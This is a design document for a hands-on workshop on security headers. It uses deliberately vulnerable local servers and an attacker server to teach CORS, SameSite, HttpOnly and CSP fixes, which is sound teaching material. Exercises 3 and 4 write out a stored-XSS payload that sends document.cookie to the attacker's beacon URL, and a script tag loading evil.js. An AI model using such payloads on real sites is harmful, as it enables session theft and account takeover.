# Demo Architecture — Security Headers Workshop

## Goal

Hands-on exercises where participants first watch an attack succeed against a
vulnerable server, then fix it themselves by editing a single, isolated
headers/config file — then re-run the attack to confirm it's blocked.

Four independent Node.js/Express servers run simultaneously, each on its own
origin.

## Servers

| Server | Origin | Role |
|---|---|---|
| `login-server` | `http://localhost:4000` | Issues the session cookie on login. Owns the cookie's `SameSite`/`HttpOnly`/`Secure` flags. |
| `api-server` | `http://localhost:4001` | `GET`/`POST` on the message list, gated by the session cookie. Owns CORS headers. |
| `frontend-server` | `http://localhost:3000` | Serves the "Secret Messageboard" UI (login, read list, add entry) as static files + vanilla JS. Owns CSP. |
| `evil-server` | `http://127.0.0.1:5000` | Attacker-controlled origin: CORS-read demo, CSRF POST, evil script, image beacon, and a `/captured` viewer page showing everything it has stolen. |

**Why evil-server is on `127.0.0.1` instead of `localhost`:** browsers decide
whether a cookie is blocked by `SameSite` by comparing *registrable domain*
("site"), not full origin — `localhost:3000`, `:4000`, `:4001` all share the
host string `localhost` and count as the **same site**, even though they're
different *origins* for CORS/SOP. If evil-server were also on `localhost`,
the `SameSite` fix in exercise 2 would not actually block it. Using
`127.0.0.1` gives evil-server a genuinely different site with zero setup
(no hosts file edits, works on any OS/browser out of the box).

**Why login-server and api-server are separate processes:** cookies are
scoped by host, not port, so a cookie set by `login-server` (host
`localhost`) is still sent to `api-server` (also host `localhost`)
automatically. Small teaching moment about cookie scoping vs. origin.

## Directory layout

```
demo/
  package.json              # npm workspaces root — one `npm install`, one start-all command
  exercises/
    01-cors.md               # attack steps, what to edit, expected result
    02-csrf.md
    03-exfiltration.md
    04-xss.md
  servers/
    login-server/
      server.js             # route logic (untouched during exercises)
      headers.js            # cookie flags — THE file participants edit
    api-server/
      server.js
      headers.js             # CORS config — THE file participants edit
    frontend-server/
      server.js              # thin static file server
      headers.js             # CSP config — THE file participants edit
      public/                # index.html, app.js, style.css — vanilla JS fetch() calls
    evil-server/
      server.js              # attacker logic (not edited by participants)
  solutions/
    login-server/headers.js
    api-server/headers.js
    frontend-server/headers.js
```

`solutions/` holds only the corrected `headers.js` files — a fallback
reference for a stuck participant or presenter, copy-pasted over the
in-progress version to unblock and move on.

`exercises/*.md` are the hands-on working reference participants read while
doing each exercise (attack steps, which file to edit, expected before/after
behavior). The `presentation/` slides carry the conceptual/background
narrative (why SOP exists, how CORS preflight works, what CSP directives
mean) rather than step-by-step instructions.

## Implementation style

- Plain Express + vanilla JS `fetch()` calls, no frontend framework or build
  step. `frontend-server` just serves static files from `public/`; all
  login/list/add-entry logic is client-side JS calling `login-server` and
  `api-server` cross-origin with `credentials: 'include'`. This means the
  *legitimate* app only works once CORS is configured correctly — fixing
  CORS isn't just "block the attacker," it's "allow exactly the real
  frontend."
- npm workspaces at the root so setup is `npm install` once and
  `npm run start:all` (via `concurrently` or similar) to bring up all four
  servers together.

## The `headers.js` convention

Each of the three "real" servers (`login`, `api`, `frontend`) has a
`headers.js` that exports the security-relevant config and is applied as
middleware in `server.js`. This is the **only** file that differs between the
vulnerable and fixed state of an exercise — route/business logic never
changes. This keeps each fix a small, reviewable diff in one place.

`evil-server` has no `headers.js` — it's the attacker, not something
participants patch.

## Auth & session model

Deliberately trivial and insecure — this workshop teaches headers, not
session security, so the mechanism itself is a non-issue by design and
called out as such in the exercises.

- **Login:** `POST /login` on `login-server` accepts exactly one fixed demo
  account, username `demo` / password `demo`. `POST /logout` clears the
  cookie. No "any credentials accepted" ambiguity, nothing else to remember.
- **Cookie value:** `dummy-verify-string:<issuedAtMillis>` — a plain string,
  not signed or encrypted. The `SameSite`/`HttpOnly`/`Secure` attributes on
  this cookie are what each exercise manipulates; the value itself never
  changes.
- **Validation:** `api-server` checks the cookie locally on each request: does
  it contain `dummy-verify-string`, and is the embedded timestamp under 1h
  old? That's it — no shared secret, no HMAC, no network call to
  `login-server`. This sidesteps the question of how two separate processes
  would normally share session state, which is out of scope for this
  workshop.

## Exercise sequence

Exercises are **independently seeded and verifiable** — each one's attack can
be reproduced regardless of which other fixes have already been applied, or
re-run after a fix without depending on earlier exercises staying broken.
Where a stored-XSS entry is needed as setup, the participant posts it
themselves via the legitimate frontend (logged in as a normal user) rather
than relying on a still-exploitable CSRF to plant it.

Order is chosen so CSP's `script-src` fix (which kills the stored-XSS attack
at the root) comes **last** — exercise 3 needs the XSS to still be exploitable
to demonstrate `HttpOnly` as a defense-in-depth measure independent of CSP.

### 1. CORS data leak
- **Attack:** evil-server's page does `fetch('http://localhost:4001/list', {credentials:'include'})` and reads the response.
- **Vulnerable:** `api-server/headers.js` reflects any `Origin` header back with `Access-Control-Allow-Credentials: true`.
- **Fix:** restrict `Access-Control-Allow-Origin` to exactly `http://localhost:3000`.

### 2. CSRF write
- **Attack:** evil-server silently submits a cross-origin POST to `api-server`'s add-entry endpoint. The response is unreadable, but the write still succeeds.
- **Vulnerable:** `login-server/headers.js` sets the cookie with `SameSite=None; Secure` explicitly. (Explicit, not omitted — Chrome's default-`Lax`-when-unspecified behavior would otherwise partially block this anyway, making the "before" state unreliable across browsers.)
- **Fix:** change to `SameSite=Lax`.

### 3. Cookie exfiltration via image beacon
- **Setup:** participant logs in normally and posts a message-board entry containing a script that reads `document.cookie` and requests it from evil-server's beacon endpoint (e.g. `new Image().src = 'http://127.0.0.1:5000/beacon.png?c=' + document.cookie`).
- **Attack:** viewing the board (even just by the same user re-loading it) executes the entry; the beacon logs the captured cookie value, visible on evil-server's `/captured` page.
- **Vulnerable:** `login-server/headers.js` cookie has no `HttpOnly`.
- **Fix:** add `HttpOnly`. Re-running the same attack still fires the beacon request (the script still executes — CSP isn't fixed yet) but the captured value is now empty, showing `HttpOnly` limits damage without needing CSP.

### 4. Stored XSS root cause
- **Attack:** same entry mechanism as exercise 3, or a `<script src="http://127.0.0.1:5000/evil.js">` entry.
- **Vulnerable:** `frontend-server/headers.js` sends no CSP (or one with no `script-src` restriction).
- **Fix:** `Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self' http://localhost:4000 http://localhost:4001`.
  **Note:** `connect-src` must explicitly include login-server and api-server's origins, since the legitimate frontend's own JS calls them cross-origin — without this the real app breaks, not just the attack.
  Re-running exercise 3's attack now shows nothing fires at all — the entry's script never executes, so the earlier `HttpOnly` fix is visibly redundant-but-still-good defense-in-depth.

## Deferred / explicitly out of scope for now

- **CSRF token** as a second, more advanced fix for exercise 2 — deferred until the four core exercises work end-to-end. Will be added later as a clearly separate, optional extension with its own instructions.
- Output-encoding fix for the stored-XSS entries — deliberately not required; CSP alone is the graded fix for exercise 4 (encoding is mentioned as a best-practice aside, not a step).

## Endpoints

| Server | Endpoint | Purpose |
|---|---|---|
| `login-server` | `POST /login` | body `{username, password}`, only `demo`/`demo` succeeds; sets the session cookie |
| `login-server` | `POST /logout` | clears the session cookie |
| `api-server` | `GET /list` | returns the message list; requires a valid session cookie |
| `api-server` | `POST /list` | body `{text}`, appends an entry; requires a valid session cookie |
| `api-server` | `DELETE /list` | clears the in-memory list (debug/demo-reset only, unsecured) |
| `frontend-server` | `GET /*` (static) | serves `public/` — login form, message board, add-entry form, all vanilla JS `fetch()` |
| `evil-server` | `GET /` | index page linking to each attack demo |
| `evil-server` | `GET /steal` | CORS-read demo: fetches `api-server`'s list with credentials and displays whatever it manages to read |
| `evil-server` | `GET /csrf` | CSRF demo: silently POSTs a new entry to `api-server` on page load |
| `evil-server` | `GET /evil.js` | XSS payload script, loaded by a malicious message-board entry |
| `evil-server` | `GET /beacon.png` | image-beacon logger: records query params (e.g. exfiltrated cookie), timestamp, and source IP, returns a 1×1 image |
| `evil-server` | `GET /captured` | viewer page rendering everything captured so far |
| `evil-server` | `POST /reset` | clears the captured log (same convention as `api-server`'s reset) |

## `/captured` page

Renders the in-memory captured-events log as an HTML table (time, type —
`cors-read` / `csrf-post` / `beacon-hit`, source, details). Uses JS polling
(re-fetches and re-renders every few seconds) so it updates live during a
demo without the presenter touching it.

## Reset mechanism

`api-server` exposes an unsecured debug endpoint `POST /reset` that clears
the in-memory message list, and `evil-server` exposes the equivalent for its
captured log — so participants/presenter can reset between attempts without
restarting all four servers.
